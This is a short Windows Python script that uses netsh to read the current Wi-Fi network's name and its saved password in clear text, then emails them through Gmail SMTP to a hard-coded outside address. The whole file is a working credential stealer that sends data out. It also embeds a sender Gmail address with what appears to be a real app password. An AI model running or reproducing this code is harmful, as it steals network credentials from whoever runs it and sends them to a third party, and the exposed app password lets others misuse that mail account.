import subprocess
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def get_current_ssid():
    try:
        # Run the command to get the current SSID
        result = subprocess.run(
            ['netsh', 'wlan', 'show', 'interfaces'], 
            stdout=subprocess.PIPE, 
            text=True, 
            check=True
        )
        
        # Filter lines containing "SSID"
        lines = result.stdout.splitlines()
        for line in lines:
            if "SSID" in line and not "BSSID" in line:
                # Extract and return the SSID name, removing trailing spaces
                ssid = line.split(":")[1].strip()
                return ssid.rstrip()
    except subprocess.CalledProcessError as e:
        print("Error executing command:", e)
        return None

def get_wifi_password(ssid):
    try:
        # Run the command to get the Wi-Fi profile with the key (password) shown in clear text
        result = subprocess.run(
            ['netsh', 'wlan', 'show', 'profile', ssid, 'key=clear'], 
            stdout=subprocess.PIPE, 
            text=True, 
            check=True
        )
        
        # Filter lines containing "Key Content" to find the password
        lines = result.stdout.splitlines()
        for line in lines:
            if "Key Content" in line:
                # Extract and return the password
                password = line.split(":")[1].strip()
                return password
    except subprocess.CalledProcessError as e:
        print("Error executing command:", e)
        return None

def send_email(subject, body, to_email):
    # Gmail SMTP server configuration
    smtp_server = "smtp.gmail.com"
    smtp_port = 587
    from_email = "blacknihojini@gmail.com"  # Replace with your Gmail address
    password = "yzmc blom mpst mnsk"  # Replace with your Gmail app password

    try:
        # Create the email
        msg = MIMEMultipart()
        msg['From'] = from_email
        msg['To'] = to_email
        msg['Subject'] = subject

        # Attach the body with the msg instance
        msg.attach(MIMEText(body, 'plain'))

        # Connect to the Gmail server and send the email
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(from_email, password)
        text = msg.as_string()
        server.sendmail(from_email, to_email, text)
        server.quit()
        
        print("Email sent successfully!")
    except Exception as e:
        print("Failed to send email:", e)

if __name__ == "__main__":
    ssid = get_current_ssid()
    if ssid:
        password = get_wifi_password(ssid)
        if password:
            subject = f"Wi-Fi Password for {ssid}"
            body = f"The password for Wi-Fi network '{ssid}' is: {password}"
            to_email = "iamkeadevs@gmail.com"  # Replace with the recipient's Gmail address
            send_email(subject, body, to_email)
        else:
            print("Password not found or unable to retrieve.")
    else:
        print("No SSID found.")
